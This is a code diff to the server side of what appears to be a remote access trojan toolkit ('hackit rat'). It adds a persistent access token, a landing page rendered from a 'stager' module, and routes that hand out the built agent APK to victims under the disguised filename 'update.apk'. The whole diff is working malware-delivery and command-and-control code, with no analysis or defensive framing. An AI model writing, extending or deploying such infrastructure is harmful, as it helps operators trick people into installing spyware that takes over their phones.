@@ -35,6 +35,21 @@ from . import protocol, store
 from .protocol import ProtocolError
 
 
+def load_web_token() -> str:
+    """Stable token shared by the web agent, the installer links and the APK."""
+    path = os.path.join(store.ROOT, "webtoken")
+    if os.path.isfile(path):
+        value = open(path, encoding="utf-8").read().strip()
+        if value:
+            return value
+    value = secrets.token_urlsafe(9)
+    os.makedirs(store.ROOT, exist_ok=True)
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(value)
+    os.chmod(path, 0o600)
+    return value
+
+
 @dataclass
 class Hub:
     """Shared runtime state: PSK, operator auth, per-session wakeups."""
@@ -44,6 +59,7 @@ class Hub:
     public_url: str
     web_token: str = ""
     udp_port: int = 0
+    dist_dir: str = ""
     max_tasks: int = 8
     stale_after: int = 180
     offline_after: int = 300
@@ -394,6 +410,45 @@ async def _web_ok(request: web.Request) -> None:
         raise web.HTTPForbidden(text="bad web token")
 
 
+def _dist(name: str) -> Optional[str]:
+    folder = store.ROOT + "/dist"
+    if not os.path.isdir(folder):
+        return None
+    exact = []
+    any_apk = []
+    for base, _dirs, names in os.walk(folder):
+        for entry in names:
+            path = os.path.join(base, entry)
+            if entry == name:
+                exact.append((os.path.getmtime(path), path))
+            elif name.endswith(".apk") and entry.endswith(".apk"):
+                any_apk.append((os.path.getmtime(path), path))
+    pool = exact or (any_apk if name.endswith(".apk") else [])
+    return max(pool)[1] if pool else None
+
+
+async def download_apk(request: web.Request) -> web.Response:
+    if not hmac.compare_digest(request.match_info["token"], request.app["hub"].web_token):
+        raise web.HTTPForbidden(text="bad token")
+    path = _dist("agent.apk")
+    if not path:
+        path = _dist("any")
+    if not path:
+        raise web.HTTPNotFound(text="no apk built yet — run: hackit rat build")
+    return web.FileResponse(path, headers={"Content-Disposition": 'attachment; filename="update.apk"'})
+
+
+async def download_index(request: web.Request) -> web.Response:
+    if not hmac.compare_digest(request.match_info["token"], request.app["hub"].web_token):
+        raise web.HTTPForbidden(text="bad token")
+    token = request.match_info["token"]
+    host = request.app["hub"].public_url
+    from . import stager
+
+    html = stager.LANDING.format(host=host, token=token)
+    return web.Response(text=html, content_type="text/html")
+
+
 async def webapp(request: web.Request) -> web.Response:
     await _web_ok(request)
     token = json.dumps(request.match_info["token"])
@@ -603,6 +658,8 @@ def make_app(hub: Hub) -> web.Application:
             web.delete("/api/session/{sid}", api_forget),
             web.get("/api/stats", api_stats),
             web.get("/", dashboard),
+            web.get("/dl/{token}/", download_index),
+            web.get("/dl/{token}/{name}", download_apk),
             web.get("/w/{token}/", webapp),
             web.get("/w/{token}/{name}", webasset),
             web.post("/v1/web/{token}", web_report),
@@ -657,7 +714,7 @@ async def serve(host: str, port: int, psk_path: str, token: Optional[str], publi
     psk = load_psk(psk_path) if os.path.exists(psk_path) else write_psk(psk_path)
     token = token or secrets.token_urlsafe(24)
     hub = Hub(psk=psk, token=token, public_url=public_url,
-              web_token=secrets.token_urlsafe(9), udp_port=udp_port)
+              web_token=load_web_token(), udp_port=udp_port)
     app = make_app(hub)
     runner = web.AppRunner(app, access_log=None)
     await runner.setup()
